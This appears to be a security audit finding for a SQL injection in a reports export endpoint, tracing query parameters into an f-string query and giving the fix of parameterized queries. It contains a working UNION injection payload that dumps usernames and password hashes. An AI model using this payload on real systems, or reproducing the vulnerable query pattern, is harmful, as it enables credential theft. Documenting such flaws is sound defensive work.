# VULN-016 — SQL Injection in Reports Export (`from_date`/`to_date`)

- **CWE**: 89
- **Severity**: High+
- **Endpoint**: `GET /reports/export` (auth; session forgeable)
- **Sink**: `reports.py:79-84`

## Static Data Flow Trace

```
1. ENTRY: GET /reports/export?from_date=' UNION SELECT id,username,password FROM users--&to_date=x
   -> reports.py:70  from_date from query string
   -> reports.py:71  to_date from query string

2. PROPAGATION: both interpolated into an f-string SQL query, plus uid inlined.
   -> reports.py:79-83
      query = f"SELECT filename, path, created FROM documents "
              f"WHERE owner_id = {uid} "
              f"AND created >= '{from_date}' AND created <= '{to_date}'"

3. SINK: executed directly.
   -> reports.py:84  db.execute(query).fetchall()
   Concrete SQL:
      SELECT filename, path, created FROM documents WHERE owner_id = 2
      AND created >= '' UNION SELECT id, username, password FROM users-- ...
   The UNION returns rows from `users`, escaping the owner_id scope.

4. IMPACT: Cross-table DB read — dump usernames + password hashes into the
   CSV/PDF export.
```

## Attacker gains
Read arbitrary tables (e.g. the `users` table with password hashes) via UNION, bypassing the owner_id scoping.

## Expected vs Actual
- Secure app: parameterized query with bound date params.
- Vulnerable app: f-string interpolation → UNION injection succeeds.
